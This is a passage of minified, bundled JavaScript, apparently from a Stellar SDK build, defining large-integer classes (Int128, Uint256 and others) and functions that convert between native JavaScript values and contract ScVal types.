        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function O(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, w(fe.key), fe)
        }
    }
    function x(ne, oe, ue) {
        return oe && O(ne.prototype, oe),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function w(ne) {
        var oe = b(ne, "string");
        return _(oe) == "symbol" ? oe : oe + ""
    }
    function b(ne, oe) {
        if (_(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (_(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    function X(ne, oe, ue) {
        return oe = K(oe),
        Y(ne, V() ? Reflect.construct(oe, ue || [], K(ne).constructor) : oe.apply(ne, ue))
    }
    function Y(ne, oe) {
        if (oe && (_(oe) == "object" || typeof oe == "function"))
            return oe;
        if (oe !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return F(ne)
    }
    function F(ne) {
        if (ne === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ne
    }
    function V() {
        try {
            var ne = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (V = function() {
            return !!ne
        }
        )()
    }
    function K(ne) {
        return K = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(oe) {
            return oe.__proto__ || Object.getPrototypeOf(oe)
        }
        ,
        K(ne)
    }
    function Q(ne, oe) {
        if (typeof oe != "function" && oe !== null)
            throw new TypeError("Super expression must either be null or a function");
        ne.prototype = Object.create(oe && oe.prototype, {
            constructor: {
                value: ne,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        oe && ee(ne, oe)
    }
    function ee(ne, oe) {
        return ee = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ue, fe) {
            return ue.__proto__ = fe,
            ue
        }
        ,
        ee(ne, oe)
    }
    var ae = uint256.Uint256 = function(ne) {
        function oe() {
            j(this, oe);
            for (var ue = arguments.length, fe = new Array(ue), he = 0; he < ue; he++)
                fe[he] = arguments[he];
            return X(this, oe, [fe])
        }
        return Q(oe, ne),
        x(oe, [{
            key: "unsigned",
            get: function() {
                return !0
            }
        }, {
            key: "size",
            get: function() {
                return 256
            }
        }])
    }(M.LargeInt);
    return ae.defineIntBoundaries(),
    uint256
}
var int128 = {}, hasRequiredInt128;
function requireInt128() {
    if (hasRequiredInt128)
        return int128;
    hasRequiredInt128 = 1;
    function _(ne) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        _(ne)
    }
    Object.defineProperty(int128, "__esModule", {
        value: !0
    }),
    int128.Int128 = void 0;
    var M = requireXdr$1();
    function j(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function O(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, w(fe.key), fe)
        }
    }
    function x(ne, oe, ue) {
        return oe && O(ne.prototype, oe),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function w(ne) {
        var oe = b(ne, "string");
        return _(oe) == "symbol" ? oe : oe + ""
    }
    function b(ne, oe) {
        if (_(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (_(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    function X(ne, oe, ue) {
        return oe = K(oe),
        Y(ne, V() ? Reflect.construct(oe, ue || [], K(ne).constructor) : oe.apply(ne, ue))
    }
    function Y(ne, oe) {
        if (oe && (_(oe) == "object" || typeof oe == "function"))
            return oe;
        if (oe !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return F(ne)
    }
    function F(ne) {
        if (ne === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ne
    }
    function V() {
        try {
            var ne = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (V = function() {
            return !!ne
        }
        )()
    }
    function K(ne) {
        return K = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(oe) {
            return oe.__proto__ || Object.getPrototypeOf(oe)
        }
        ,
        K(ne)
    }
    function Q(ne, oe) {
        if (typeof oe != "function" && oe !== null)
            throw new TypeError("Super expression must either be null or a function");
        ne.prototype = Object.create(oe && oe.prototype, {
            constructor: {
                value: ne,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        oe && ee(ne, oe)
    }
    function ee(ne, oe) {
        return ee = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ue, fe) {
            return ue.__proto__ = fe,
            ue
        }
        ,
        ee(ne, oe)
    }
    var ae = int128.Int128 = function(ne) {
        function oe() {
            j(this, oe);
            for (var ue = arguments.length, fe = new Array(ue), he = 0; he < ue; he++)
                fe[he] = arguments[he];
            return X(this, oe, [fe])
        }
        return Q(oe, ne),
        x(oe, [{
            key: "unsigned",
            get: function() {
                return !1
            }
        }, {
            key: "size",
            get: function() {
                return 128
            }
        }])
    }(M.LargeInt);
    return ae.defineIntBoundaries(),
    int128
}
var int256 = {}, hasRequiredInt256;
function requireInt256() {
    if (hasRequiredInt256)
        return int256;
    hasRequiredInt256 = 1;
    function _(ne) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        _(ne)
    }
    Object.defineProperty(int256, "__esModule", {
        value: !0
    }),
    int256.Int256 = void 0;
    var M = requireXdr$1();
    function j(ne, oe) {
        if (!(ne instanceof oe))
            throw new TypeError("Cannot call a class as a function")
    }
    function O(ne, oe) {
        for (var ue = 0; ue < oe.length; ue++) {
            var fe = oe[ue];
            fe.enumerable = fe.enumerable || !1,
            fe.configurable = !0,
            "value"in fe && (fe.writable = !0),
            Object.defineProperty(ne, w(fe.key), fe)
        }
    }
    function x(ne, oe, ue) {
        return oe && O(ne.prototype, oe),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        ne
    }
    function w(ne) {
        var oe = b(ne, "string");
        return _(oe) == "symbol" ? oe : oe + ""
    }
    function b(ne, oe) {
        if (_(ne) != "object" || !ne)
            return ne;
        var ue = ne[Symbol.toPrimitive];
        if (ue !== void 0) {
            var fe = ue.call(ne, oe);
            if (_(fe) != "object")
                return fe;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ne)
    }
    function X(ne, oe, ue) {
        return oe = K(oe),
        Y(ne, V() ? Reflect.construct(oe, ue || [], K(ne).constructor) : oe.apply(ne, ue))
    }
    function Y(ne, oe) {
        if (oe && (_(oe) == "object" || typeof oe == "function"))
            return oe;
        if (oe !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return F(ne)
    }
    function F(ne) {
        if (ne === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return ne
    }
    function V() {
        try {
            var ne = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (V = function() {
            return !!ne
        }
        )()
    }
    function K(ne) {
        return K = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(oe) {
            return oe.__proto__ || Object.getPrototypeOf(oe)
        }
        ,
        K(ne)
    }
    function Q(ne, oe) {
        if (typeof oe != "function" && oe !== null)
            throw new TypeError("Super expression must either be null or a function");
        ne.prototype = Object.create(oe && oe.prototype, {
            constructor: {
                value: ne,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(ne, "prototype", {
            writable: !1
        }),
        oe && ee(ne, oe)
    }
    function ee(ne, oe) {
        return ee = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ue, fe) {
            return ue.__proto__ = fe,
            ue
        }
        ,
        ee(ne, oe)
    }
    var ae = int256.Int256 = function(ne) {
        function oe() {
            j(this, oe);
            for (var ue = arguments.length, fe = new Array(ue), he = 0; he < ue; he++)
                fe[he] = arguments[he];
            return X(this, oe, [fe])
        }
        return Q(oe, ne),
        x(oe, [{
            key: "unsigned",
            get: function() {
                return !1
            }
        }, {
            key: "size",
            get: function() {
                return 256
            }
        }])
    }(M.LargeInt);
    return ae.defineIntBoundaries(),
    int256
}
var hasRequiredXdr_large_int;
function requireXdr_large_int() {
    if (hasRequiredXdr_large_int)
        return xdr_large_int;
    hasRequiredXdr_large_int = 1,
    Object.defineProperty(xdr_large_int, "__esModule", {
        value: !0
    }),
    xdr_large_int.XdrLargeInt = void 0;
    var _ = requireXdr$1()
      , M = requireUint128()
      , j = requireUint256()
      , O = requireInt128()
      , x = requireInt256()
      , w = b(requireXdr());
    function b(ae) {
        return ae && ae.__esModule ? ae : {
            default: ae
        }
    }
    function X(ae) {
        "@babel/helpers - typeof";
        return X = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ne) {
            return typeof ne
        }
        : function(ne) {
            return ne && typeof Symbol == "function" && ne.constructor === Symbol && ne !== Symbol.prototype ? "symbol" : typeof ne
        }
        ,
        X(ae)
    }
    function Y(ae, ne) {
        if (!(ae instanceof ne))
            throw new TypeError("Cannot call a class as a function")
    }
    function F(ae, ne) {
        for (var oe = 0; oe < ne.length; oe++) {
            var ue = ne[oe];
            ue.enumerable = ue.enumerable || !1,
            ue.configurable = !0,
            "value"in ue && (ue.writable = !0),
            Object.defineProperty(ae, Q(ue.key), ue)
        }
    }
    function V(ae, ne, oe) {
        return ne && F(ae.prototype, ne),
        oe && F(ae, oe),
        Object.defineProperty(ae, "prototype", {
            writable: !1
        }),
        ae
    }
    function K(ae, ne, oe) {
        return (ne = Q(ne))in ae ? Object.defineProperty(ae, ne, {
            value: oe,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : ae[ne] = oe,
        ae
    }
    function Q(ae) {
        var ne = ee(ae, "string");
        return X(ne) == "symbol" ? ne : ne + ""
    }
    function ee(ae, ne) {
        if (X(ae) != "object" || !ae)
            return ae;
        var oe = ae[Symbol.toPrimitive];
        if (oe !== void 0) {
            var ue = oe.call(ae, ne);
            if (X(ue) != "object")
                return ue;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return String(ae)
    }
    return xdr_large_int.XdrLargeInt = function() {
        function ae(ne, oe) {
            switch (Y(this, ae),
            K(this, "int", void 0),
            K(this, "type", void 0),
            oe instanceof Array || (oe = [oe]),
            oe = oe.map(function(ue) {
                return typeof ue == "bigint" ? ue : ue instanceof ae ? ue.toBigInt() : BigInt(ue)
            }),
            ne) {
            case "i64":
                this.int = new _.Hyper(oe);
                break;
            case "i128":
                this.int = new O.Int128(oe);
                break;
            case "i256":
                this.int = new x.Int256(oe);
                break;
            case "u64":
                this.int = new _.UnsignedHyper(oe);
                break;
            case "u128":
                this.int = new M.Uint128(oe);
                break;
            case "u256":
                this.int = new j.Uint256(oe);
                break;
            default:
                throw TypeError("invalid type: ".concat(ne))
            }
            this.type = ne
        }
        return V(ae, [{
            key: "toNumber",
            value: function() {
                var oe = this.int.toBigInt();
                if (oe > Number.MAX_SAFE_INTEGER || oe < Number.MIN_SAFE_INTEGER)
                    throw RangeError("value ".concat(oe, " not in range for Number ") + "[".concat(Number.MAX_SAFE_INTEGER, ", ").concat(Number.MIN_SAFE_INTEGER, "]"));
                return Number(oe)
            }
        }, {
            key: "toBigInt",
            value: function() {
                return this.int.toBigInt()
            }
        }, {
            key: "toI64",
            value: function() {
                this._sizeCheck(64);
                var oe = this.toBigInt();
                if (BigInt.asIntN(64, oe) !== oe)
                    throw RangeError("value too large for i64: ".concat(oe));
                return w.default.ScVal.scvI64(new w.default.Int64(oe))
            }
        }, {
            key: "toU64",
            value: function() {
                return this._sizeCheck(64),
                w.default.ScVal.scvU64(new w.default.Uint64(BigInt.asUintN(64, this.toBigInt())))
            }
        }, {
            key: "toI128",
            value: function() {
                this._sizeCheck(128);
                var oe = this.int.toBigInt()
                  , ue = BigInt.asIntN(64, oe >> 64n)
                  , fe = BigInt.asUintN(64, oe);
                return w.default.ScVal.scvI128(new w.default.Int128Parts({
                    hi: new w.default.Int64(ue),
                    lo: new w.default.Uint64(fe)
                }))
            }
        }, {
            key: "toU128",
            value: function() {
                this._sizeCheck(128);
                var oe = this.int.toBigInt();
                return w.default.ScVal.scvU128(new w.default.UInt128Parts({
                    hi: new w.default.Uint64(BigInt.asUintN(64, oe >> 64n)),
                    lo: new w.default.Uint64(BigInt.asUintN(64, oe))
                }))
            }
        }, {
            key: "toI256",
            value: function() {
                var oe = this.int.toBigInt()
                  , ue = BigInt.asIntN(64, oe >> 192n)
                  , fe = BigInt.asUintN(64, oe >> 128n)
                  , he = BigInt.asUintN(64, oe >> 64n)
                  , pe = BigInt.asUintN(64, oe);
                return w.default.ScVal.scvI256(new w.default.Int256Parts({
                    hiHi: new w.default.Int64(ue),
                    hiLo: new w.default.Uint64(fe),
                    loHi: new w.default.Uint64(he),
                    loLo: new w.default.Uint64(pe)
                }))
            }
        }, {
            key: "toU256",
            value: function() {
                var oe = this.int.toBigInt()
                  , ue = BigInt.asUintN(64, oe >> 192n)
                  , fe = BigInt.asUintN(64, oe >> 128n)
                  , he = BigInt.asUintN(64, oe >> 64n)
                  , pe = BigInt.asUintN(64, oe);
                return w.default.ScVal.scvU256(new w.default.UInt256Parts({
                    hiHi: new w.default.Uint64(ue),
                    hiLo: new w.default.Uint64(fe),
                    loHi: new w.default.Uint64(he),
                    loLo: new w.default.Uint64(pe)
                }))
            }
        }, {
            key: "toScVal",
            value: function() {
                switch (this.type) {
                case "i64":
                    return this.toI64();
                case "i128":
                    return this.toI128();
                case "i256":
                    return this.toI256();
                case "u64":
                    return this.toU64();
                case "u128":
                    return this.toU128();
                case "u256":
                    return this.toU256();
                default:
                    throw TypeError("invalid type: ".concat(this.type))
                }
            }
        }, {
            key: "valueOf",
            value: function() {
                return this.int.valueOf()
            }
        }, {
            key: "toString",
            value: function() {
                return this.int.toString()
            }
        }, {
            key: "toJSON",
            value: function() {
                return {
                    value: this.toBigInt().toString(),
                    type: this.type
                }
            }
        }, {
            key: "_sizeCheck",
            value: function(oe) {
                if (this.int.size > oe)
                    throw RangeError("value too large for ".concat(oe, " bits (").concat(this.type, ")"))
            }
        }], [{
            key: "isType",
            value: function(oe) {
                switch (oe) {
                case "i64":
                case "i128":
                case "i256":
                case "u64":
                case "u128":
                case "u256":
                    return !0;
                default:
                    return !1
                }
            }
        }, {
            key: "getType",
            value: function(oe) {
                return oe.slice(3).toLowerCase()
            }
        }])
    }(),
    xdr_large_int
}
var sc_int = {}, hasRequiredSc_int;
function requireSc_int() {
    if (hasRequiredSc_int)
        return sc_int;
    hasRequiredSc_int = 1;
    function _(Q) {
        "@babel/helpers - typeof";
        return _ = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(ee) {
            return typeof ee
        }
        : function(ee) {
            return ee && typeof Symbol == "function" && ee.constructor === Symbol && ee !== Symbol.prototype ? "symbol" : typeof ee
        }
        ,
        _(Q)
    }
    Object.defineProperty(sc_int, "__esModule", {
        value: !0
    }),
    sc_int.ScInt = void 0;
    var M = requireXdr_large_int();
    function j(Q, ee, ae) {
        return Object.defineProperty(Q, "prototype", {
            writable: !1
        }),
        Q
    }
    function O(Q, ee) {
        if (!(Q instanceof ee))
            throw new TypeError("Cannot call a class as a function")
    }
    function x(Q, ee, ae) {
        return ee = Y(ee),
        w(Q, X() ? Reflect.construct(ee, ae || [], Y(Q).constructor) : ee.apply(Q, ae))
    }
    function w(Q, ee) {
        if (ee && (_(ee) == "object" || typeof ee == "function"))
            return ee;
        if (ee !== void 0)
            throw new TypeError("Derived constructors may only return object or undefined");
        return b(Q)
    }
    function b(Q) {
        if (Q === void 0)
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return Q
    }
    function X() {
        try {
            var Q = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {}))
        } catch {}
        return (X = function() {
            return !!Q
        }
        )()
    }
    function Y(Q) {
        return Y = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(ee) {
            return ee.__proto__ || Object.getPrototypeOf(ee)
        }
        ,
        Y(Q)
    }
    function F(Q, ee) {
        if (typeof ee != "function" && ee !== null)
            throw new TypeError("Super expression must either be null or a function");
        Q.prototype = Object.create(ee && ee.prototype, {
            constructor: {
                value: Q,
                writable: !0,
                configurable: !0
            }
        }),
        Object.defineProperty(Q, "prototype", {
            writable: !1
        }),
        ee && V(Q, ee)
    }
    function V(Q, ee) {
        return V = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(ae, ne) {
            return ae.__proto__ = ne,
            ae
        }
        ,
        V(Q, ee)
    }
    sc_int.ScInt = function(Q) {
        function ee(ae, ne) {
            var oe;
            O(this, ee);
            var ue = ae < 0
              , fe = (oe = ne == null ? void 0 : ne.type) !== null && oe !== void 0 ? oe : "";
            if (fe.startsWith("u") && ue)
                throw TypeError("specified type ".concat(ne.type, " yet negative (").concat(ae, ")"));
            if (fe === "") {
                fe = ue ? "i" : "u";
                var he = K(ae);
                switch (he) {
                case 64:
                case 128:
                case 256:
                    fe += he.toString();
                    break;
                default:
                    throw RangeError("expected 64/128/256 bits for input (".concat(ae, "), got ").concat(he))
                }
            }
            return x(this, ee, [fe, ae])
        }
        return F(ee, Q),
        j(ee)
    }(M.XdrLargeInt);
    function K(Q) {
        var ee, ae = Q.toString(2).length;
        return (ee = [64, 128, 256].find(function(ne) {
            return ae <= ne
        })) !== null && ee !== void 0 ? ee : ae
    }
    return sc_int
}
var hasRequiredNumbers;
function requireNumbers() {
    return hasRequiredNumbers || (hasRequiredNumbers = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        Object.defineProperty(_, "Int128", {
            enumerable: !0,
            get: function() {
                return x.Int128
            }
        }),
        Object.defineProperty(_, "Int256", {
            enumerable: !0,
            get: function() {
                return w.Int256
            }
        }),
        Object.defineProperty(_, "ScInt", {
            enumerable: !0,
            get: function() {
                return b.ScInt
            }
        }),
        Object.defineProperty(_, "Uint128", {
            enumerable: !0,
            get: function() {
                return j.Uint128
            }
        }),
        Object.defineProperty(_, "Uint256", {
            enumerable: !0,
            get: function() {
                return O.Uint256
            }
        }),
        Object.defineProperty(_, "XdrLargeInt", {
            enumerable: !0,
            get: function() {
                return M.XdrLargeInt
            }
        }),
        _.scValToBigInt = X;
        var M = requireXdr_large_int()
          , j = requireUint128()
          , O = requireUint256()
          , x = requireInt128()
          , w = requireInt256()
          , b = requireSc_int();
        function X(Y) {
            var F = M.XdrLargeInt.getType(Y.switch().name);
            switch (Y.switch().name) {
            case "scvU32":
            case "scvI32":
                return BigInt(Y.value());
            case "scvU64":
            case "scvI64":
                return new M.XdrLargeInt(F,Y.value()).toBigInt();
            case "scvU128":
            case "scvI128":
                return new M.XdrLargeInt(F,[Y.value().lo(), Y.value().hi()]).toBigInt();
            case "scvU256":
            case "scvI256":
                return new M.XdrLargeInt(F,[Y.value().loLo(), Y.value().loHi(), Y.value().hiLo(), Y.value().hiHi()]).toBigInt();
            default:
                throw TypeError("expected integer type, got ".concat(Y.switch()))
            }
        }
    }(numbers)),
    numbers
}
var scval = {}, hasRequiredScval;
function requireScval() {
    if (hasRequiredScval)
        return scval;
    hasRequiredScval = 1,
    Object.defineProperty(scval, "__esModule", {
        value: !0
    }),
    scval.nativeToScVal = ee,
    scval.scValToNative = ae;
    var _ = w(requireXdr())
      , M = requireKeypair()
      , j = requireAddress()
      , O = requireContract()
      , x = requireNumbers();
    function w(ne) {
        return ne && ne.__esModule ? ne : {
            default: ne
        }
    }
    function b(ne, oe) {
        return K(ne) || V(ne, oe) || Y(ne, oe) || X()
    }
    function X() {
        throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
    }
    function Y(ne, oe) {
        if (ne) {
            if (typeof ne == "string")
                return F(ne, oe);
            var ue = {}.toString.call(ne).slice(8, -1);
            return ue === "Object" && ne.constructor && (ue = ne.constructor.name),
            ue === "Map" || ue === "Set" ? Array.from(ne) : ue === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(ue) ? F(ne, oe) : void 0
        }
    }
    function F(ne, oe) {
        (oe == null || oe > ne.length) && (oe = ne.length);
        for (var ue = 0, fe = Array(oe); ue < oe; ue++)
            fe[ue] = ne[ue];
        return fe
    }
    function V(ne, oe) {
        var ue = ne == null ? null : typeof Symbol < "u" && ne[Symbol.iterator] || ne["@@iterator"];
        if (ue != null) {
            var fe, he, pe, ye, be = [], xe = !0, Ae = !1;
            try {
                if (pe = (ue = ue.call(ne)).next,
                oe === 0) {
                    if (Object(ue) !== ue)
                        return;
                    xe = !1
                } else
                    for (; !(xe = (fe = pe.call(ue)).done) && (be.push(fe.value),
                    be.length !== oe); xe = !0)
                        ;
            } catch (Ee) {
                Ae = !0,
                he = Ee
            } finally {
                try {
                    if (!xe && ue.return != null && (ye = ue.return(),
                    Object(ye) !== ye))
                        return
                } finally {
                    if (Ae)
                        throw he
                }
            }
            return be
        }
    }
    function K(ne) {
        if (Array.isArray(ne))
            return ne
    }
    function Q(ne) {
        "@babel/helpers - typeof";
        return Q = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(oe) {
            return typeof oe
        }
        : function(oe) {
            return oe && typeof Symbol == "function" && oe.constructor === Symbol && oe !== Symbol.prototype ? "symbol" : typeof oe
        }
        ,
        Q(ne)
    }
    function ee(ne) {
        var oe = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
        switch (Q(ne)) {
        case "object":
            {
                var ue, fe;
                if (ne === null)
                    return _.default.ScVal.scvVoid();
                if (ne instanceof _.default.ScVal)
                    return ne;
                if (ne instanceof j.Address)
                    return ne.toScVal();
                if (ne instanceof M.Keypair)
                    return ee(ne.publicKey(), {
                        type: "address"
                    });
                if (ne instanceof O.Contract)
                    return ne.address().toScVal();
                if (ne instanceof Uint8Array || Buffer.isBuffer(ne)) {
                    var he, pe = Uint8Array.from(ne);
                    switch ((he = oe == null ? void 0 : oe.type) !== null && he !== void 0 ? he : "bytes") {
                    case "bytes":
                        return _.default.ScVal.scvBytes(pe);
                    case "symbol":
                        return _.default.ScVal.scvSymbol(pe);
                    case "string":
                        return _.default.ScVal.scvString(pe);
                    default:
                        throw new TypeError("invalid type (".concat(oe.type, ") specified for bytes-like value"))
                    }
                }
                if (Array.isArray(ne))
                    return _.default.ScVal.scvVec(ne.map(function(Ae) {
                        return ee(Ae, oe)
                    }));
                if (((ue = (fe = ne.constructor) === null || fe === void 0 ? void 0 : fe.name) !== null && ue !== void 0 ? ue : "") !== "Object") {
                    var ye;
                    throw new TypeError("cannot interpret ".concat((ye = ne.constructor) === null || ye === void 0 ? void 0 : ye.name, " value as ScVal (").concat(JSON.stringify(ne), ")"))
                }
                return _.default.ScVal.scvMap(Object.entries(ne).sort(function(Ae, Ee) {
                    var Be = b(Ae, 1)
                      , ce = Be[0]
                      , q = b(Ee, 1)
                      , L = q[0];
                    return ce.localeCompare(L)
                }).map(function(Ae) {
                    var Ee, Be, ce = b(Ae, 2), q = ce[0], L = ce[1], U = (Ee = ((Be = oe == null ? void 0 : oe.type) !== null && Be !== void 0 ? Be : {})[q]) !== null && Ee !== void 0 ? Ee : [null, null], Z = b(U, 2), te = Z[0], se = Z[1], de = te ? {
                        type: te
                    } : {}, re = se ? {
                        type: se
                    } : {};
                    return new _.default.ScMapEntry({
                        key: ee(q, de),
                        val: ee(L, re)
                    })
                }))
            }
        case "number":
        case "bigint":
            switch (oe == null ? void 0 : oe.type) {
            case "u32":
                return _.default.ScVal.scvU32(ne);
            case "i32":
                return _.default.ScVal.scvI32(ne)
            }
            return new x.ScInt(ne,{
                type: oe == null ? void 0 : oe.type
            }).toScVal();
        case "string":
            {
                var be, xe = (be = oe == null ? void 0 : oe.type) !== null && be !== void 0 ? be : "string";
                switch (xe) {
                case "string":
                    return _.default.ScVal.scvString(ne);
                case "symbol":
                    return _.default.ScVal.scvSymbol(ne);
                case "address":
                    return new j.Address(ne).toScVal();
                case "u32":
                    return _.default.ScVal.scvU32(parseInt(ne, 10));
                case "i32":
                    return _.default.ScVal.scvI32(parseInt(ne, 10));
                default:
                    if (x.XdrLargeInt.isType(xe))
                        return new x.XdrLargeInt(xe,ne).toScVal();
                    throw new TypeError("invalid type (".concat(oe.type, ") specified for string value"))
                }
            }
        case "boolean":
            return _.default.ScVal.scvBool(ne);
        case "undefined":
            return _.default.ScVal.scvVoid();
        case "function":
            return ee(ne());
        default:
            throw new TypeError("failed to convert typeof ".concat(Q(ne), " (").concat(ne, ")"))
        }
    }
    function ae(ne) {
        var oe, ue;
        switch (ne.switch().value) {
        case _.default.ScValType.scvVoid().value:
            return null;
        case _.default.ScValType.scvU64().value:
        case _.default.ScValType.scvI64().value:
            return ne.value().toBigInt();
        case _.default.ScValType.scvU128().value:
        case _.default.ScValType.scvI128().value:
        case _.default.ScValType.scvU256().value:
        case _.default.ScValType.scvI256().value:
            return (0,
            x.scValToBigInt)(ne);
        case _.default.ScValType.scvVec().value:
            return ((oe = ne.vec()) !== null && oe !== void 0 ? oe : []).map(ae);
        case _.default.ScValType.scvAddress().value:
            return j.Address.fromScVal(ne).toString();
        case _.default.ScValType.scvMap().value:
            return Object.fromEntries(((ue = ne.map()) !== null && ue !== void 0 ? ue : []).map(function(pe) {
                return [ae(pe.key()), ae(pe.val())]
            }));
        case _.default.ScValType.scvBool().value:
        case _.default.ScValType.scvU32().value:
        case _.default.ScValType.scvI32().value:
        case _.default.ScValType.scvBytes().value:
            return ne.value();
        case _.default.ScValType.scvSymbol().value:
        case _.default.ScValType.scvString().value:
            {
                var fe = ne.value();
                if (Buffer.isBuffer(fe) || ArrayBuffer.isView(fe))
                    try {
                        return new TextDecoder().decode(fe)
                    } catch {
                        return new Uint8Array(fe.buffer)
                    }
                return fe
            }
        case _.default.ScValType.scvTimepoint().value:
        case _.default.ScValType.scvDuration().value:
            return new _.default.Uint64(ne.value()).toBigInt();
        case _.default.ScValType.scvError().value:
            switch (ne.error().switch().value) {
            case _.default.ScErrorType.sceContract().value:
                return {
                    type: "contract",
                    code: ne.error().contractCode()
                };
            default:
                {
                    var he = ne.error();
                    return {
                        type: "system",
                        code: he.code().value,
                        value: he.code().name
                    }
                }
            }
        default:
            return ne.value()
        }
    }
    return _.default.scvSortedMap = function(ne) {
        var oe = Array.from(ne).sort(function(ue, fe) {
            var he = ae(ue.key())
              , pe = ae(fe.key());
            switch (Q(he)) {
            case "number":
            case "bigint":
                return he < pe ? -1 : 1;
            default:
                return he.toString().localeCompare(pe.toString())
            }
        });
        return _.default.ScVal.scvMap(oe)
    }
    ,
    scval
}
var events = {}, hasRequiredEvents;
function requireEvents() {
    if (hasRequiredEvents)
        return events;
    hasRequiredEvents = 1,
    Object.defineProperty(events, "__esModule", {
        value: !0
    }),
    events.humanizeEvents = Y;
    var _ = requireStrkey()
      , M = requireScval();
    function j(V) {
        "@babel/helpers - typeof";
        return j = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(K) {
            return typeof K
        }
        : function(K) {
            return K && typeof Symbol == "function" && K.constructor === Symbol && K !== Symbol.prototype ? "symbol" : typeof K
        }
        ,
        j(V)
    }
    function O(V, K) {
        var Q = Object.keys(V);
        if (Object.getOwnPropertySymbols) {
            var ee = Object.getOwnPropertySymbols(V);
            K && (ee = ee.filter(function(ae) {
                return Object.getOwnPropertyDescriptor(V, ae).enumerable
            })),
            Q.push.apply(Q, ee)
        }
        return Q
    }
    function x(V) {
        for (var K = 1; K < arguments.length; K++) {
            var Q = arguments[K] != null ? arguments[K] : {};
            K % 2 ? O(Object(Q), !0).forEach(function(ee) {
                w(V, ee, Q[ee])
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(V, Object.getOwnPropertyDescriptors(Q)) : O(Object(Q)).forEach(function(ee) {
                Object.defineProperty(V, ee, Object.getOwnPropertyDescriptor(Q, ee))
            })
        }
        return V
    }
    function w(V, K, Q) {
        return (K = b(K))in V ? Object.defineProperty(V, K, {
            value: Q,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : V[K] = Q,
        V
    }
    function b(V) {
        var K = X(V, "string");
        return j(K) == "symbol" ? K : K + ""
    }
    function X(V, K) {
        if (j(V) != "object" || !V)
            return V;
        var Q = V[Symbol.toPrimitive];
        if (Q !== void 0) {
            var ee = Q.call(V, K);
            if (j(ee) != "object")
                return ee;
            throw new TypeError("@@toPrimitive must return a primitive value.")
        }
        return (K === "string" ? String : Number)(V)
    }
    function Y(V) {
        return V.map(function(K) {
            return K.inSuccessfulContractCall ? F(K.event()) : F(K)
        })
    }
    function F(V) {
        return x(x({}, typeof V.contractId == "function" && V.contractId() != null && {
            contractId: _.StrKey.encodeContract(V.contractId())
        }), {}, {
            type: V.type().name,
            topics: V.body().value().topics().map(function(K) {
                return (0,
